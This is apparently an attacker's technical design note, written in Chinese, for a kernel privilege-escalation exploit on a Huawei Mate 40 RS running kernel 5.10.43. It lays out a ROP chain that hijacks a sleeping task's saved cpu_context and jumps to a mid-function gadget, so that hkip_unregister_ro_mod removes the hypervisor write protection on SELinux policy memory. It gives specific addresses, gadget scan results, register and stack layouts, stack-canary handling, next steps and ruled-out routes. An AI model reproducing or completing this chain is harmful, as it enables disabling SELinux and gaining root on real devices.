# HVC 路线（route C）静态设计 —— Mate 40 RS / 5.10.43

目标：在内核上下文调用 `hkip_unregister_ro_mod(selinux_pool_va_start, va_size)`，
由它自己完成 `w0 = 0xC6001033 ; bl hkip_hvc`，从而解除 `selinux_pool` 的 EL2
只读保护，之后即可用已可用的纯数据写改策略。
**不需要我们直接发 HVC**，只需要「用两个受控参数调用一个普通 C 函数」。

全部结论均来自 `dump_full.txt`（14,079,926 条指令）与 `ref\nop_syms.txt`。

---

## 一、已确认的控制流入口：`cpu_context`

`cpu_switch_to`（`0xffffffc010003cc0`）：

```asm
mov  x10, #0xb50                 ; task->thread.cpu_context
add  x8, x0, x10
stp  x19, x20, [x8], #0x10       ; +0xb50
stp  x21, x22, [x8], #0x10       ; +0xb60
stp  x23, x24, [x8], #0x10       ; +0xb70
stp  x25, x26, [x8], #0x10       ; +0xb80
stp  x27, x28, [x8], #0x10       ; +0xb90
stp  x29, x9,  [x8], #0x10       ; +0xba0   (x9 = 保存的 sp)
str  x30,      [x8]              ; +0xbb0   (返回地址)
...
mov  sp, x9
ret                              ; ← 控制流转移，不经过任何 CFI 检查
```

⇒ 改写一个已切换出去的睡眠任务的 `cpu_context`，即可完全控制
**x19–x28、x29、sp、x30**。偏移：`cpu_context = task + 0xb50`。

`ret_from_fork`（`0xffffffc010003d14`）另给一条单参数调用：

```asm
bl   schedule_tail
cbz  x19, .skip
mov  x0, x20
blr  x19          ; → x19(x20)，函数指针与参数均来自 cpu_context，无 CFI
.skip: mrs x28, SP_EL0 ; b ret_to_user
```

## 二、CFI 约束（排除「改函数指针」路线）

`try_to_wake_up` 内的间接调用带类型校验：

```asm
ldr  x20, [x22], #0x18
sub  x8, x20, x23
ror  x8, x8, #0x2
cmp  x8, #0x12
b.hs __cfi_slowpath          ; 类型哈希不匹配 → slowpath
blr  x20
```

`CONFIG_HKIP_CFI_HARDEN=y`，所以覆盖 `file_operations` / `sched_class` 之类的
函数指针会被 CFI 拦截。**只有 `ret` 不受约束**，因此必须 ROP。

## 三、gadget 盘点（全镜像扫描结果）

| 形状 | 结果 |
|---|---|
| `... ldp x0,x1,[sp] ... ldp x2,x3,[sp] ... ret`（TASZK `get_pt_regs`） | **0** |
| `... 从栈装载 x0/x1 ... blr xN ; 干净 epilogue ; ret` | **0** |
| `mov x0, x19 ; 干净 epilogue ; ret` | **0** |
| `ldr/ldur x1, [sp, #N] ; ret` | **0** |
| `ldr/ldur x0, [sp, #N] ; ret` | 2（`0xffffffc01075dc0c`、`0xffffffc01087206c`） |
| `ldr/ldur x8, [sp, #N] ; ret` | 5 |
| `blr x8 ; ldp x29,x30,[sp,#0x10] ; add sp,sp,#0x20 ; ret` | 有（`0xffffffc0100a9a44`） |
| `hvc #0 ; ret` | 有（`0xffffffc010003de8`，`__hyp_set_vectors+8`） |

**两点硬结论**：
1. 不存在「从栈把 x1 装进寄存器再返回」的 gadget ⇒ TASZK 式的纯栈装载链在本镜像走不通；
2. 几乎所有 epilogue 都会 `ldp` 回 x19–x28（callee-saved），因此「多条 `mov xD,xS` + ret」串联会在收尾处自毁。

## 四、目前唯一可行的候选：`menu_select` 尾段

`0xffffffc01119a704`（mid-function 入口）：

```asm
ldp  x1, x2, [sp, #0x10]     ; x1 = [sp+0x10]  ← 参数 2 来自栈
add  x8, sp, #0x30
sub  x4, x29, #0x24
mov  x0, x19                 ; x0 = x19        ← 参数 1 来自 cpu_context
mov  x3, x22
mov  x5, x23
mov  x6, x27
mov  w7, w26
str  x8, [sp]
blr  x25                     ; x25 = hkip_unregister_ro_mod（cpu_context 可控）
ldr  w8, [sp, #0x30]         ; 调用返回后：读 [sp+0x30]
cbz  w8, 0xffffffc01119a618
ldr  w0, [x22]
...
```

这是**完整的两参数调用原语**：x0 来自 x19、x1 来自栈、目标来自 x25，全部可控。

### 尾段已走完（全静态确认，可以直接用）

```asm
ffffffc01119a72c  ldr  w8, [sp, #0x30]        ; 必须非 0
ffffffc01119a730  cbz  w8, 0xffffffc01119a618 ; 为 0 则转向别处
ffffffc01119a734  ldr  w0, [x22]              ; x22 必须指向可读内存
ffffffc01119a738  adrp x9, 0xffffffc0136e2000
ffffffc01119a73c  ldur x8, [x29, #-0x8]       ; 栈保护值槽
ffffffc01119a740  ldr  x9, [x9, #0xd48]       ; __stack_chk_guard
ffffffc01119a744  cmp  x9, x8
ffffffc01119a748  b.ne 0xffffffc01119a76c     ; __stack_chk_fail —— 必须相等
ffffffc01119a74c  ldp  x20, x19, [sp, #0xb0]
...
ffffffc01119a760  ldp  x29, x30, [sp, #0x60]  ; 干净收尾
ffffffc01119a764  add  sp, sp, #0xc0
ffffffc01119a768  ret
```

### 完整链（全部字段都由 `cpu_context` 或我们自己的植入页决定）

`cpu_context`（`task + 0xb50`）字段：

| 偏移 | 寄存器 | 取值 |
|---|---|---|
| +0xb50 | x19 | `pool_va_start`（→ x0） |
| +0xb68 | x22 | `植入页 + RO_PTR_OFF`（可读） |
| +0xb80 | x25 | `hkip_unregister_ro_mod`（`KIMAGE + 0x22085b0`） |
| +0xba0 | x29 | `植入页 + CANARY_FRAME`（使 `[x29-8]` 放保护值） |
| +0xba8 | sp  | `植入页 + CHAIN_OFF` |
| +0xbb0 | x30 | `0xffffffc01119a704`（gadget 入口） |

植入页内栈布局（相对 `sp`）：

| 槽位 | 值 |
|---|---|
| `sp+0x10` | `pool_va_size`（→ x1） |
| `sp+0x18` | 任意（x2） |
| `sp+0x30` | 非 0（例如 1） |
| `sp+0x60` | 任意（收尾用 x29） |
| `sp+0x68` | `0xffffffc0100038c8` = `finish_ret_to_user` |

另需 `[x29-8] = *(__stack_chk_guard)` =
`*(KIMAGE_TEXT_BASE + 0x036e2d48 + slide)`，可用已验证的 configfs 读取得。

## 五、剩余工作（静态已完成，待实现 + 一次实测）

1. 实现：找/选一个已切换出去的任务 → 改写 `task+0xb50..0xbb0` → 唤醒它；
   `task` 地址可用现有 `find_task_by_tgid()` 从 task 链表走到；
2. 设备侧输入（同一次运行内取，均为纯读）：`selinux_prot_pool + 0x8 →
   pmalloc_list`，node 的 `+0x10 va_start` / `+0x18 va_size`（须 4K 对齐，
   `hkip_reg_unreg` 里有 `BUG_ON((addr|size) & ~PAGE_MASK)`），以及
   `__stack_chk_guard`；
3. 判定：`hkip_unregister_ro_mod` 返回 0 即成功；随后可直写 `policy+0x254`
   （`allow_unknown`）或 permissive 位图，再用 uid-0 的 `su` 做访问测试。

## 六、已排除的路线（不要再试）

- **AVC 投毒**：写入已证实落地（`confirmed == wrote`，6 轮 283~291 个节点，
  `bad=0`），但 uid=0 的 `u:r:s​hell:s0` 进程访问 `/data/data` 仍被拒 ⇒ 单独不足。
- **configfs 写 slab**：会 `kernel BUG at mm/usercopy.c:111`
  （`SLUB object 'nsproxy' (offset 12, size 4)`），必须用 pipe 写。
- **改函数指针劫持控制流**：CFI 拦截。
- **`selinux_state+8` / policy 字段直写**：EL2 保护，写即 panic（实测 3/3）。
